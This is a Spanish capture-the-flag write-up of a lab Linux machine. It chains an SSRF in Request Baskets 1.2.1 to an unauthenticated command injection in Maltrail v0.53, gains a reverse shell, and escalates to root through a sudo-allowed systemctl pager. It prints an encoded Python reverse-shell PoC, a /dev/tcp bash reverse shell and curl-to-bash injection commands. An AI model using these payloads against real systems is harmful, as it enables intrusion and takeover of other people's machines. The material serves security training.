
![[Pasted image 20250310001948.png]]

## Inicio

Lo primero que realizaremos por simple protocolo será lanzar una traza ICMP para comprobar si la maquina esta activa, haciendo uso del comando:

```zsh
$ ping -c 1 10.129.229.26

PING 10.129.229.26 (10.129.229.26) 56(84) bytes of data.
64 bytes from 10.129.229.26: icmp_seq=1 ttl=63 time=275 ms

--- 10.129.229.26 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 274.899/274.899/274.899/0.000 ms
```

Inicialmente observamos que, la traza nos ha devuelvo un `ttl=63`, que por proximidad, lo que nos indica que estamos ante una maquina Linux. Ya que, a pesar de que este puede ser modificada, en la plataforma como tal es algo que ya esta predefinido.
## Reconocimiento
### Enumeración de Puertos

Primeramente haremos una enumeración inicial de puerto, con el objetivo de obtener todos los puertos que están a nuestro alcance y que estén abiertos.

```zsh
$ map 10.129.229.26 -p- -sS -Pn -n --min-rate=5000 -oG allPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-10 00:50 CST
Nmap scan report for 10.129.229.26
Host is up (0.28s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 16.58 seconds
```

> [!INFO]
> Por alguna razón, `nmap` nos detecta dos puertos que no logra concretar si los puertos `80` y `8338` están cerrados, o abiertos.

### Escaneo de Puertos

Una vez que ya hemos enumerado los puertos que están abiertos, proseguimos a realizar un escaneo mas profundo, usando los scripts mas comunes de nmap.

```zsh
$ nmap 10.129.229.26 -p 22,55555 -sCV -oN alltarget                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-09 21:50 CST
Nmap scan report for 10.129.229.26
Host is up (0.33s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 10 Mar 2025 03:51:27 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 10 Mar 2025 03:51:00 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 10 Mar 2025 03:51:03 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
...
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.39 seconds
```


Como podemos observar, a través del puerto `55555` esta corriendo un servicio HTTP, asi que veamos que podemos encontrar en el navegador.

![[Pasted image 20250310002415.png]]
### Revisando el sitio web

Observamos que de primera mano podemos crear & inspeccionar una solicitud.

![[Pasted image 20250310005622.png]]

Al crearla, nos devuelve un token en un popUp diciéndonos que ya se ha creado.

![[Pasted image 20250310005647.png]]

Si leemos el enunciado, nos dice que nuestra cesta esta vacia. Y si leemos el enunciado, nos dice que si alguien trata de enviar una solicitud nosotros la veremos en nuestro apartado.

![[Pasted image 20250310005826.png]]

Asi que tomamos el link y vamos a ello!

![[Pasted image 20250310005855.png]]

No encontramos nada en el link, pero en nuestro apartado si que hemos recibido la solicitud.

![[Pasted image 20250310005948.png]]

Revisando los botones, en el apartado de configuración, notamos que podemos realizar modificaciones al sitio.

![[Pasted image 20250310010120.png]]
### Enumerando tecnologías

Nos apoyamos de la herramienta `whatweb` para enumerar algunas tecnologías.

```java
$ whatweb http://10.129.229.26:55555/web

Bootstrap[3.3.7]
JQuery[3.2.1]
```

Adicionalmente, en el footer, observamos que se esta ocupando el servicio `Powered by request-baskets | Version: 1.2.1 `

![[Pasted image 20250310002832.png]]

> [!TIP] Request Baskets
> 
> Request Baskets es un servicio web diseñado para capturar peticiones HTTP arbitrarias y facilitar su inspección a través de una API RESTful o de una sencilla interfaz web de usuario.
> 
> Este servicio se inspira en los conceptos y principios de diseño de aplicaciones del proyecto RequestHub y recrea la funcionalidad que anteriormente ofrecía el servicio RequestBin
>  
> ![[Pasted image 20250310002935.png]]
> 

### Identificación de vulnerabilidades

Basándonos en las tecnologías que ocupa el sitio, sabemos que es vulnerable ante diferentes ataques de `cross-site injection` por las librerías del `jQuery & Boostrap` que se encuentran desactualizadas. Y adicionalmente también encontramos que el servicio `request-basket` posee un CVE en su versión `1.2.1`.

https://github.com/mathias-mrsn/request-baskets-v121-ssrf
```embed
title: "Fetching"
image: "data:image/svg+xml;base64,PHN2ZyBjbGFzcz0ibGRzLW1pY3Jvc29mdCIgd2lkdGg9IjgwcHgiICBoZWlnaHQ9IjgwcHgiICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCI+PGcgdHJhbnNmb3JtPSJyb3RhdGUoMCkiPjxjaXJjbGUgY3g9IjgxLjczNDEzMzYxMTY0OTQxIiBjeT0iNzQuMzUwNDU3MTYwMzQ4ODIiIGZpbGw9IiNlMTViNjQiIHI9IjUiIHRyYW5zZm9ybT0icm90YXRlKDM0MC4wMDEgNDkuOTk5OSA1MCkiPgogIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgdHlwZT0icm90YXRlIiBjYWxjTW9kZT0ic3BsaW5lIiB2YWx1ZXM9IjAgNTAgNTA7MzYwIDUwIDUwIiB0aW1lcz0iMDsxIiBrZXlTcGxpbmVzPSIwLjUgMCAwLjUgMSIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGR1cj0iMS41cyIgYmVnaW49IjBzIj48L2FuaW1hdGVUcmFuc2Zvcm0+CjwvY2lyY2xlPjxjaXJjbGUgY3g9Ijc0LjM1MDQ1NzE2MDM0ODgyIiBjeT0iODEuNzM0MTMzNjExNjQ5NDEiIGZpbGw9IiNmNDdlNjAiIHI9IjUiIHRyYW5zZm9ybT0icm90YXRlKDM0OC4zNTIgNTAuMDAwMSA1MC4wMDAxKSI+CiAgPGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIGNhbGNNb2RlPSJzcGxpbmUiIHZhbHVlcz0iMCA1MCA1MDszNjAgNTAgNTAiIHRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuNSAwIDAuNSAxIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIgZHVyPSIxLjVzIiBiZWdpbj0iLTAuMDYyNXMiPjwvYW5pbWF0ZVRyYW5zZm9ybT4KPC9jaXJjbGU+PGNpcmNsZSBjeD0iNjUuMzA3MzM3Mjk0NjAzNiIgY3k9Ijg2Ljk1NTE4MTMwMDQ1MTQ3IiBmaWxsPSIjZjhiMjZhIiByPSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgzNTQuMjM2IDUwIDUwKSI+CiAgPGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIGNhbGNNb2RlPSJzcGxpbmUiIHZhbHVlcz0iMCA1MCA1MDszNjAgNTAgNTAiIHRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuNSAwIDAuNSAxIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIgZHVyPSIxLjVzIiBiZWdpbj0iLTAuMTI1cyI+PC9hbmltYXRlVHJhbnNmb3JtPgo8L2NpcmNsZT48Y2lyY2xlIGN4PSI1NS4yMjEwNDc2ODg4MDIwNyIgY3k9Ijg5LjY1Nzc5NDQ1NDk1MjQxIiBmaWxsPSIjYWJiZDgxIiByPSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgzNTcuOTU4IDUwLjAwMDIgNTAuMDAwMikiPgogIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgdHlwZT0icm90YXRlIiBjYWxjTW9kZT0ic3BsaW5lIiB2YWx1ZXM9IjAgNTAgNTA7MzYwIDUwIDUwIiB0aW1lcz0iMDsxIiBrZXlTcGxpbmVzPSIwLjUgMCAwLjUgMSIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGR1cj0iMS41cyIgYmVnaW49Ii0wLjE4NzVzIj48L2FuaW1hdGVUcmFuc2Zvcm0+CjwvY2lyY2xlPjxjaXJjbGUgY3g9IjQ0Ljc3ODk1MjMxMTE5NzkzIiBjeT0iODkuNjU3Nzk0NDU0OTUyNDEiIGZpbGw9IiM4NDliODciIHI9IjUiIHRyYW5zZm9ybT0icm90YXRlKDM1OS43NiA1MC4wMDY0IDUwLjAwNjQpIj4KICA8YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgY2FsY01vZGU9InNwbGluZSIgdmFsdWVzPSIwIDUwIDUwOzM2MCA1MCA1MCIgdGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC41IDAgMC41IDEiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBkdXI9IjEuNXMiIGJlZ2luPSItMC4yNXMiPjwvYW5pbWF0ZVRyYW5zZm9ybT4KPC9jaXJjbGU+PGNpcmNsZSBjeD0iMzQuNjkyNjYyNzA1Mzk2NDE1IiBjeT0iODYuOTU1MTgxMzAwNDUxNDciIGZpbGw9IiNlMTViNjQiIHI9IjUiIHRyYW5zZm9ybT0icm90YXRlKDAuMTgzNTUyIDUwIDUwKSI+CiAgPGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIGNhbGNNb2RlPSJzcGxpbmUiIHZhbHVlcz0iMCA1MCA1MDszNjAgNTAgNTAiIHRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuNSAwIDAuNSAxIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIgZHVyPSIxLjVzIiBiZWdpbj0iLTAuMzEyNXMiPjwvYW5pbWF0ZVRyYW5zZm9ybT4KPC9jaXJjbGU+PGNpcmNsZSBjeD0iMjUuNjQ5NTQyODM5NjUxMTc2IiBjeT0iODEuNzM0MTMzNjExNjQ5NDEiIGZpbGw9IiNmNDdlNjAiIHI9IjUiIHRyYW5zZm9ybT0icm90YXRlKDEuODY0NTcgNTAgNTApIj4KICA8YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgY2FsY01vZGU9InNwbGluZSIgdmFsdWVzPSIwIDUwIDUwOzM2MCA1MCA1MCIgdGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC41IDAgMC41IDEiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBkdXI9IjEuNXMiIGJlZ2luPSItMC4zNzVzIj48L2FuaW1hdGVUcmFuc2Zvcm0+CjwvY2lyY2xlPjxjaXJjbGUgY3g9IjE4LjI2NTg2NjM4ODM1MDYiIGN5PSI3NC4zNTA0NTcxNjAzNDg4NCIgZmlsbD0iI2Y4YjI2YSIgcj0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoNS40NTEyNiA1MCA1MCkiPgogIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgdHlwZT0icm90YXRlIiBjYWxjTW9kZT0ic3BsaW5lIiB2YWx1ZXM9IjAgNTAgNTA7MzYwIDUwIDUwIiB0aW1lcz0iMDsxIiBrZXlTcGxpbmVzPSIwLjUgMCAwLjUgMSIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGR1cj0iMS41cyIgYmVnaW49Ii0wLjQzNzVzIj48L2FuaW1hdGVUcmFuc2Zvcm0+CjwvY2lyY2xlPjxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgdHlwZT0icm90YXRlIiBjYWxjTW9kZT0ic3BsaW5lIiB2YWx1ZXM9IjAgNTAgNTA7MCA1MCA1MCIgdGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC41IDAgMC41IDEiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBkdXI9IjEuNXMiPjwvYW5pbWF0ZVRyYW5zZm9ybT48L2c+PC9zdmc+"
description: "Fetching https://github.com/mathias-mrsn/request-baskets-v121-ssrf"
url: "https://github.com/mathias-mrsn/request-baskets-v121-ssrf"
```


![[Pasted image 20250310003625.png]]

> [!BUG] SSRF Vulnerability Exploit for Request-Baskets (CVE-2023-27163)
> CVE-2023-27163 representa una vulnerabilidad crítica de Falsificación de Peticiones del Lado del Servidor (SSRF) que fue identificada en Request-Baskets, afectando a todas las versiones hasta la 1.2.1 inclusive. Esta vulnerabilidad en particular ofrece a los actores maliciosos la capacidad de obtener acceso no autorizado a recursos de red e información confidencial mediante la explotación del componente /api/baskets/{name} a través de solicitudes de API cuidadosamente diseñadas.
> 
> ¿Cómo Funciona?
> 
> Como ya se ha mencionado, Request-Baskets funciona como una aplicación web diseñada para recoger y registrar las peticiones HTTP entrantes dirigidas a puntos finales específicos conocidos como "baskes". Durante la creación de estas cestas, los usuarios tienen la flexibilidad de especificar servidores alternativos a los que deben reenviarse estas peticiones. La cuestión crítica aquí radica en el hecho de que los usuarios pueden especificar inadvertidamente servicios a los que no deberían tener acceso, incluyendo aquellos típicamente restringidos dentro de un entorno de red.
> 
> Por ejemplo, consideremos un escenario en el que el servidor aloja Request-Baskets en el puerto `55555` y ejecuta simultáneamente un servidor web Flask en el puerto `8000`. El servidor Flask, sin embargo, está configurado para interactuar exclusivamente con el localhost. En este contexto, un atacante puede explotar la vulnerabilidad SSRF creando una cesta que reenvíe peticiones a `http://localhost:8000`, saltándose de forma efectiva las restricciones de red anteriores y obteniendo acceso al servidor web Flask, que debería haber estado restringido únicamente al acceso local.
> 
> Este exploit llama al componente de la API `/api/baskets/{name}`. Este componente crea una nueva cesta con un nombre especificado. Este componente inicia una solicitud POST con un esquema de cuerpo especificado.
> 
> ```python
> {
>   "forward_url": "https://myservice.example.com/events-collector",
>   "proxy_response": false,
>   "insecure_tls": false,
>   "expand_path": true,
>   "capacity": 250
> }
> ```
> 
> Si cambiamos el `forward_url` a un servicio local y establecemos el `proxy_response` a true, podemos crear un proxy local para peticiones HTTP en la máquina objetivo.

## Explotación de vulnerabilidades

En esta ocasión elegiremos explotar el `SSRF` ya que es el servicio principal de la web, y basándonos en el tipo de vulnerabilidad que tenemos de frente, podemos aprovecharnos para revisar si existe o esta corriendo algún servicio interno, como por ejemplo, los puertos que `nmap` catalogo como `filtered`.
### SSRF

Lo primero que haremos será comprobar que tenemos todo lo necesario para explotar un SSRF. Modificando los parámetros de entrada y comprobando en primera instancia si podemos capturarlos o interactuando de alguna manera.

Lo primero que haremos será agregar nuestra IP y configuraremos el server para que apunte hacia nosotros.

![[Pasted image 20250310011711.png]]

Luego crearemos un archivo `index.html` que contenga cualquier cosa y luego levantaremos un simple server en Python

```zsh
$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.229.26 - - [10/Mar/2025 01:12:50] "GET /index.html HTTP/1.1" 200 -
```

Y como podemos apreciar, tenemos respuesta!

![[Pasted image 20250310011657.png]]

___

Ahora comprobaremos si somos capaces de llegarle a algún recurso interno, apuntando a los puertos que `nmap` no logro resolver.

![[Pasted image 20250310012616.png]]

Y obtenemos lo siguiente.

![[Pasted image 20250310012639.png]]

> [!TIP] Recursos web
> Como podemos observar, vemos que la pagina no se esta cargando correctamente, y eso puede ser debio a la forma en la que esta llamando a ciertos recursos.
> 
> ![[Pasted image 20250310012911.png]]
> 
> Como observamos, esta llamando a los recursos `js..` pero sin la `/`, por lo tanto tendremos que agregarle una `/` al final de nuestra URL.
> 
> ![[Pasted image 20250310013022.png]]
> 
> Y listo!

### Unauthenticated OS Command Injection (RCE)

> [!INFO] Maltrail
> **Maltrail** es un sistema de detección de tráfico malicioso, que utiliza listas públicas (listas negras) que contienen pistas maliciosas y generalmente sospechosas, junto con pistas estáticas compiladas a partir de varios informes AV y listas personalizadas definidas por el usuario, donde puede ser cualquier cosa, desde el nombre de dominio (por ejemplo `zvpprsensinaix.com` para el malware Banjori), URL (por ejemplo, `http://109.162.38.120/harsh02.exe` para el ejecutable malicioso conocido), dirección IP (por ejemplo, `185.130.5.231` para el atacante conocido) o valor del encabezado `User-Agent` de HTTP

Si revisamos el footer, damos con la versión de la tecnología a la cual nos enfrentamos.

![[Pasted image 20250310013307.png]]

Realizando una búsqueda breve en Google, nos topamos que este servicio cuenta con vulnerabilidad que escalan hasta un RCE.

![[Pasted image 20250310013835.png]]

https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5\
```embed
title: "Exploiting Maltrail v0.53 — Unauthenticated Remote Code Execution (RCE)"
image: "https://miro.medium.com/v2/da:true/resize:fit:1200/0*Oxw4LU9oFUqFSRXb"
description: "In this blog post, we will delve into an exploit for Maltrail v0.53, which allows for unauthenticated remote code execution (RCE). This…"
url: "https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5"
```

> [!BUG] Weaponized Exploit for Maltrail v0.53 Unauthenticated OS Command Injection (RCE)
> 
> **Explicacion**
> 
> En este caso concreto, el parámetro de nombre de usuario de la página de inicio de sesión no sanea correctamente la entrada, lo que permite a un atacante inyectar comandos del SO
>  
> El servicio utiliza la función subprocess.check_output() para ejecutar un comando shell que registra el nombre de usuario proporcionado por el usuario. Si un atacante proporciona un nombre de usuario especialmente diseñado, puede inyectar comandos shell arbitrarios que se ejecutarán en el servidor.
> 
> En shell scripting, se utiliza el punto y coma ; para separar varios comandos. para separar múltiples comandos. Así, cuando el atacante proporciona un nombre de usuario que incluye un punto y coma, seguido de un comando shell, el shell trata todo lo que sigue al punto y coma como un comando separado. Básicamente, todo lo que sigue a ; se ejecutará de todos modos.
> 
> ![[Pasted image 20250310014119.png]]
> 
> **PoC**
> 
> El exploit crea una carga útil de shell inversa codificada en Base64 para eludir posibles protecciones como WAF, IPS o IDS y la envía a la URL de destino mediante un comando curl.
> 
> ```python
> def curl_cmd(my_ip, my_port, target_url):
> 	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
> 	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
> 	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
> 	os.system(command)
> ```
> 
> A continuación, la carga útil se ejecuta en el sistema de destino, estableciendo una conexión de shell inversa con la IP y el puerto especificados por el atacante.

Revisando la **PoC**, observamos que busca el `/login`.

![[Pasted image 20250310014547.png]]

Comprobamos si la ruta existe.

![[Pasted image 20250310015009.png]]

Ahora que sabemos que existe, haremos una prueba, haciendo que realice una traza ICMP a nuestra maquina.

```zsh
$ curl 'http://10.129.229.26:55555/9gdxek2/login' --data 'username=;`ping -c 1 10.10.14.15`'
```

Nos ponemos en modo escucha con `tcpdump`

```zsh
$ tcpdump -i tun0 icmp -nv

tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:57:11.336408 IP (tos 0x0, ttl 63, id 32987, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.229.26 > 10.10.14.15: ICMP echo request, id 2, seq 1, length 64
01:57:11.336450 IP (tos 0x0, ttl 64, id 4508, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.14.15 > 10.129.229.26: ICMP echo reply, id 2, seq 1, length 64
```

Con esto comprobamos que es vulnerable a Command Injection!
## Acceso Inicial

### Reverse Shell

Comprobamos la existen de `curl` en la maquina victima

![[Pasted image 20250310020433.png]]

Ya que sabemos que existe `curl` en la maquina, crearemos un archivo llamado `index.html` que se va a encargar de enviarme una reverse shell.

> [!BUG] PoC
> Lo que intentamos con esto, es que si la maquina victima, envia un curl a nuestra direccion IP, va a cargar este recurso
> 
> ```bash
> !#/bin/bash
> 
> bash -i >& /dev/tcp/10.10.14.15/443 0>&1
> ```
> 
> Y ciertamente no es un `.sh` por lo que hay que indicarle que lo interprete como una bash
> 
> ```
> | bash
> ```
> 
> Haciendo que la maquina victima me devuelva una consola interactiva (bash)

Nos ponemos en modo escucha con `NetCat` y con un simple `python server`. Y enviamos:

```zsh
$ curl 'http://10.129.229.26:55555/9gdxek2/login' --data-urlencode 'username=;`curl 10.10.14.15 | bash`'
```

![[Pasted image 20250310021921.png]]

Y listo, tenemos acceso!
## Escalación de Privilegios
### Abusando de sudo

Ejecutamos `sudo -l` para identificar que permisos de ejecución tenemos.

```zsh
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Si observamos bien, nos esta indicando que el usuario `puma` puede ejecutar `/usr/bin/systemctl status trail.service` en cualquier máquina (ALL) y como cualquier usuario (ALL), sin necesidad de proporcionar una contraseña (NOPASSWD). Como por ejemplo:

```zsh
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2025-03-10 06:16:21 UTC; 2h 20min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 878 (python3)
      Tasks: 11 (limit: 4662)
     Memory: 35.7M
     CGroup: /system.slice/trail.service
             ├─ 878 /usr/bin/python3 server.py
             ├─1457 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed password for ;`curl 10.10.14.15 | bash` from 127.0.0.1 port 48570"
             ├─1458 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed password for ;`curl 10.10.14.15 | bash` from 127.0.0.1 port 48570"
             ├─1460 bash
             ├─1462 bash -i
             ├─1521 script /dev/null -c bash
             ├─1522 bash
             ├─1594 sudo -u root /usr/bin/systemctl status trail.service
             ├─1595 /usr/bin/systemctl status trail.service
             └─1596 pager

Mar 10 08:34:58 sau sudo[1581]: pam_unix(sudo:session): session opened for user root by (uid=0)
Mar 10 08:35:14 sau sudo[1581]: pam_unix(sudo:session): session closed for user root
Mar 10 08:35:16 sau sudo[1584]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service
Mar 10 08:35:16 sau sudo[1584]: pam_unix(sudo:session): session opened for user root by (uid=0)
Mar 10 08:35:24 sau sudo[1584]: pam_unix(sudo:session): session closed for user root
Mar 10 08:35:35 sau sudo[1587]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service
Mar 10 08:35:35 sau sudo[1587]: pam_unix(sudo:session): session opened for user root by (uid=0)
Mar 10 08:35:45 sau sudo[1587]: pam_unix(sudo:session): session closed for user root
Mar 10 08:37:21 sau sudo[1594]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service
Mar 10 08:37:21 sau sudo[1594]: pam_unix(sudo:session): session opened for user root by (uid=0)
```

Podemos notar algo interesante al final de la línea, y es que nos esta demostrando el output en formato `less`.

![[Pasted image 20250310024957.png]]

Si hacemos click, justamente en `lines 1-23` nos permite interactuar con ella y escribir comandos. Por lo tanto lo que haremos sera pedir una bash y ya que se esta ejecutando a nivel de `sudo`, deberá devolvernos una bash con privilegios de `root`.

![[Pasted image 20250310025321.png]]

Y listo!
## Pw3nd!

![[Pasted image 20250310025433.png]]













